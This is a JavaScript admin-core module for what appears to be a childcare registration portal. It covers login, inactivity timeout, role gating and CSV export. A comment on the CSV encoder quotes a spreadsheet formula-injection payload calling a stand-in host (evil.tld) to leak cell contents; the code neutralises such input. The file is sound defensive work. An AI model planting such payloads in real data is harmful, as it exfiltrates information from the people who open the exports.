// ============================================================
// MODULE: Admin Core (state, auth, inactivity, helpers, shared constants)
// ============================================================

// ============================================================
// STATE
// ============================================================
let currentAdminRole = 'full'; // 'full' | 'restricted' — set after login
let allRegistrations = [];
let allClosureDates  = new Set(); // YYYY-MM-DD strings — FULL closures only, no care available
let halfDayClosureDates = new Map(); // YYYY-MM-DD -> reason — partial day, morning care still bookable
let tableSortState   = { col: 'submitted', dir: 'desc' }; // default: newest first
let familiesSortBy   = 'name'; // 'name' | 'room' | 'discount' | 'age_asc' | 'age_desc'
let familiesPage     = 0;
const FAMILIES_PAGE_SIZE = 20;

// ============================================================
// LOGIN  (Supabase Auth — server-validated)
// ============================================================
document.getElementById('loginBtn').addEventListener('click', attemptLogin);
document.getElementById('loginForm').addEventListener('submit', e => { e.preventDefault(); attemptLogin(); });

async function attemptLogin() {
    const email = document.getElementById('adminEmail').value.trim();
    const pwd   = document.getElementById('adminPassword').value;
    const errEl = document.getElementById('loginError');
    const btn   = document.getElementById('loginBtn');

    errEl.classList.add('hidden');
    btn.disabled    = true;
    btn.textContent = 'Signing in…';

    try {
        await loginAdmin(email, pwd);
        showDashboard();
    } catch (_) {
        errEl.textContent = 'Incorrect email or password.';
        errEl.classList.remove('hidden');
    } finally {
        btn.disabled    = false;
        btn.textContent = 'Login';
    }
}

document.getElementById('forgotPasswordLink').addEventListener('click', async (e) => {
    e.preventDefault();
    const email    = document.getElementById('adminEmail').value.trim();
    const statusEl = document.getElementById('forgotPasswordStatus');
    const linkEl   = document.getElementById('forgotPasswordLink');

    statusEl.classList.remove('hidden');
    statusEl.style.color = '#c62828';

    if (!email || !email.includes('@')) {
        statusEl.textContent = 'Enter your email above first, then click "Forgot password?" again.';
        return;
    }

    linkEl.style.pointerEvents = 'none';
    statusEl.style.color = '#01294A';
    statusEl.textContent = 'Sending…';
    try {
        await sendPasswordReset(email);
    } catch (_) { /* fall through to the same message below regardless */ }
    statusEl.style.color = '#2e7d32';
    statusEl.textContent = 'If that email has an admin account, a reset link is on its way.';
    linkEl.style.pointerEvents = '';
});

document.getElementById('logoutBtn').addEventListener('click', async () => {
    stopInactivityTimer();
    await logoutAdmin();
    document.getElementById('loginScreen').classList.remove('hidden');
    document.getElementById('dashboard').classList.add('hidden');
    document.getElementById('adminPassword').value = '';
    document.getElementById('adminEmail').value    = '';
    document.getElementById('loginError').classList.add('hidden');
});

// ============================================================
// INACTIVITY TIMEOUT
// ============================================================
const INACTIVITY_MS = 30 * 60 * 1000; // 30 minutes
let _inactivityTimer = null;

function _resetInactivityTimer() {
    clearTimeout(_inactivityTimer);
    _inactivityTimer = setTimeout(_signOutInactive, INACTIVITY_MS);
}

async function _signOutInactive() {
    stopInactivityTimer();
    await logoutAdmin();
    document.getElementById('dashboard').classList.add('hidden');
    document.getElementById('adminPassword').value = '';
    document.getElementById('adminEmail').value    = '';
    const errEl = document.getElementById('loginError');
    errEl.textContent = 'You were signed out due to inactivity.';
    errEl.classList.remove('hidden');
    document.getElementById('loginScreen').classList.remove('hidden');
}

function startInactivityTimer() {
    ['mousemove', 'keydown', 'click', 'scroll', 'touchstart'].forEach(evt =>
        document.addEventListener(evt, _resetInactivityTimer, { passive: true })
    );
    _resetInactivityTimer();
}

function stopInactivityTimer() {
    clearTimeout(_inactivityTimer);
    ['mousemove', 'keydown', 'click', 'scroll', 'touchstart'].forEach(evt =>
        document.removeEventListener(evt, _resetInactivityTimer)
    );
}

// Turn away a session that is not an admin, BEFORE the dashboard is revealed
// or a single query is fired.
//
// ⚠ SOMEBODY WITH NO ENTRY IN admin_roles IS NOT AN ADMIN AT ALL. This used to
// fall through to 'staff' — a real admin-portal role — so a parent, and every
// family has had a genuine Supabase Auth login since
// parent_portal_option_b_accounts, could open admin.html and get the admin
// shell with the Classrooms tab on it. No family's data was ever reachable
// through it: is_admin() reads the same map and every policy refused them, so
// what rendered was an empty screen. But an admin panel rendering at all for a
// parent is not "not an admin", and an empty one reads as a broken page rather
// than a closed door.
//
// The answer comes from admin_role() in the database rather than from a second
// lookup in the browser, so the screen and the policies cannot disagree.
async function ensureAdminSession() {
    const session = await getAdminSession();
    if (!session) return false;
    const email = (session?.user?.email || '').toLowerCase().trim();

    const { ok, role } = await fetchMyAdminRole();
    if (!ok) {
        // ⚠ "Could not ask" is not "you are nobody". Fail closed — an admin
        // portal whose database is unreachable can do nothing useful anyway,
        // so refusing costs a retry, where guessing either locks out a real
        // admin or waves through someone who is not one.
        await _refuseAdmin('Could not verify your access. Check your connection and sign in again.');
        return false;
    }
    if (!role) {
        await _refuseAdmin(email
            ? `${email} is not an admin account. If you are a parent, use the family portal instead.`
            : 'This account is not an admin account.');
        return false;
    }
    window._dbAdminRole = role;
    return true;
}

// Sign out and return to the login screen carrying a reason. Same shape as
// _signOutInactive() — the dashboard must never be left on screen behind it.
async function _refuseAdmin(message) {
    window._dbAdminRole = null;
    await logoutAdmin();
    stopInactivityTimer();
    document.getElementById('dashboard').classList.add('hidden');
    document.getElementById('adminPassword').value = '';
    const errEl = document.getElementById('loginError');
    if (errEl) {
        errEl.textContent = message;
        errEl.classList.remove('hidden');
    }
    document.getElementById('loginScreen').classList.remove('hidden');
}

async function showDashboard() {
    // ⚠ Gate FIRST, while the login screen is still up — so a refused session
    // never sees the dashboard flash on screen before it is taken away.
    if (!(await ensureAdminSession())) return;
    document.getElementById('loginScreen').classList.add('hidden');
    document.getElementById('dashboard').classList.remove('hidden');
    startInactivityTimer();
    await initDashboard();    // wait for full setup before applying restrictions
    await applySessionRole(); // runs on every login — fresh roles + restrictions
}

// Determine the current user's role, apply restrictions, update display.
// Called on every login so switching accounts always reflects correctly.
async function applySessionRole() {
    _resetRoleRestrictions();
    try {
        const [roles, session] = await Promise.all([loadAdminRoles(), getAdminSession()]);
        window._adminRoles   = roles;
        window._adminSession = session;
        const email    = (session?.user?.email || '').toLowerCase().trim();
        const hasRules = Object.keys(roles).length > 0;
        // Validate the configured role against the known set so a typo in the
        // admin_roles settings (e.g. "restriced") can't silently grant access.
        // Unknown/missing roles fall back to least privilege when rules exist.
        const validRoles = Object.keys(ROLE_LABELS); // ['full','restricted','staff']
        // ⚠ MATCH CASE-INSENSITIVELY, the way admin_role() does in the database
        // (lower(kv.key) = lower(email)). admin_roles is hand-edited, so a key
        // saved as "Dinger@timothystl.org" matches every RLS policy while a
        // plain roles[email] lookup here misses it. That used to be a silent
        // demotion to 'staff'; now that a session with no role is turned away
        // by ensureAdminSession(), a mismatch between the two rules would lock
        // a real admin out of their own portal.
        const mapped = Object.entries(roles)
            .find(([k]) => k.toLowerCase().trim() === email)?.[1];
        // Prefer what the database itself said this session is — the same
        // answer the policies enforce. The map is the fallback for the
        // bootstrap case below, where there are no rules to read.
        const assigned = window._dbAdminRole || mapped;
        if (assigned && !validRoles.includes(assigned)) {
            console.warn('Unknown admin role for', email, '->', assigned, '— defaulting to staff');
        }
        currentAdminRole = validRoles.includes(assigned)
            ? assigned
            : (hasRules ? 'staff' : 'full');
        // Show logged-in email + role in header
        const displayEl = document.getElementById('currentUserDisplay');
        if (displayEl) {
            displayEl.textContent = email
                ? `${email} · ${ROLE_LABELS[currentAdminRole] || currentAdminRole}`
                : '';
        }
    } catch (err) {
        console.error('applySessionRole failed:', err);
    }
    applyRoleRestrictions();
    // Restrictions hide sections with inline display:none, and the portal
    // index is built from what is visible — so it has to be rebuilt after.
    if (typeof apRender === 'function') apRender();
    // The push toggle is 'full'-admin-only and currentAdminRole just changed.
    if (typeof apPushRefreshToggle === 'function') apPushRefreshToggle();
}

// Undo any restrictions from a previous session before applying new ones.
function _resetRoleRestrictions() {
    // setRoomsCard/setAccessCard/etc. are in this list because
    // applyRoleRestrictions() hides them for `restricted` — without this, a
    // full admin logging in after a restricted one on the same page would
    // keep Rooms & rates hidden (and the portal, which indexes by
    // visibility, would drop the whole Settings tool).
    // staffRosterSection is no longer in this list — applyRoleRestrictions()
    // stopped hiding it for `restricted` (she can see the roster now, just
    // not pay/payroll), so there is nothing here for this reset to undo.
    ['logHoursSection', 'payrollSection', 'addStaffBtn', 'setAccessCard', 'setRoomsCard',
     'setClosedDaysBlock', 'setSummerCampBlock', 'offerLinksSection']
        .forEach(id => {
            const el = document.getElementById(id);
            if (el) el.style.display = '';
        });
}

// Auto-restore session if already logged in — wait for all scripts to load first
document.addEventListener('DOMContentLoaded', async () => {
    const session = await getAdminSession();
    if (session) showDashboard();
});

// ============================================================
// SHARED CONSTANTS
// ============================================================
// MONTH_NAMES is defined in supabase.js (loaded first) and shared globally.

// ============================================================
// HELPERS
// ============================================================
// CSV field encoder. Handles two separate concerns:
//   1. RFC 4180 quoting for delimiters, quotes and newlines.
//   2. Spreadsheet formula injection (R17). Excel, Sheets and Numbers execute a
//      cell that begins with = + - or @, so a parent-supplied child name of
//      `=HYPERLINK("https://evil.tld?"&A1)` would fire when an admin opens an
//      export. Prefixing an apostrophe forces the cell to be read as text; the
//      apostrophe is not displayed by the spreadsheet.
// ============================================================
// showToast — the admin bundle's notification
// ============================================================
// ⚠️ THIS DID NOT EXIST until 2026-08-12, and three callers assumed it did.
// js/app.js defines a showToast, but that file is the PARENT registration
// bundle — it is not part of dist/admin.min.js. So:
//   * admin-calendar.js guarded with `typeof showToast === 'function'`, which
//     meant its "the invoice could not be recalculated" warning NEVER showed —
//     a silent failure in billing, the one place silence is least affordable
//   * admin-incidents.js and admin-threads.js called it unguarded, so a
//     SUCCESSFUL incident approval or message reply threw ReferenceError into
//     the catch block and reported itself as an error
//
// Defining it once here fixes all three, and the guard in admin-calendar now
// passes instead of quietly skipping.
function showToast(msg, kind = 'ok') {
    let el = document.getElementById('adminToast');
    if (!el) {
        el = document.createElement('div');
        el.id = 'adminToast';
        document.body.appendChild(el);
    }
    el.textContent = msg;
    el.className = 'admin-toast' + (kind === 'error' ? ' admin-toast-err' : '');
    el.classList.add('show');
    clearTimeout(showToast._t);
    // Errors linger: a director who looked away should still find out that the
    // thing she clicked did not work.
    showToast._t = setTimeout(() => el.classList.remove('show'), kind === 'error' ? 6000 : 3000);
}

function csvCell(val) {
    let str = String(val ?? '');
    if (/^[=+\-@\t\r]/.test(str)) str = `'${str}`;
    return str.includes(',') || str.includes('"') || str.includes('\n')
        ? `"${str.replace(/"/g, '""')}"` : str;
}

function downloadFile(name, type, content) {
    const blob = new Blob([content], { type });
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement('a');
    a.href = url; a.download = name; a.click();
    URL.revokeObjectURL(url);
}

function friendlyShort(dateStr) {
    return new Date(dateStr + 'T00:00:00').toLocaleDateString('en-US',
        { month: 'short', day: 'numeric', year: 'numeric' });
}

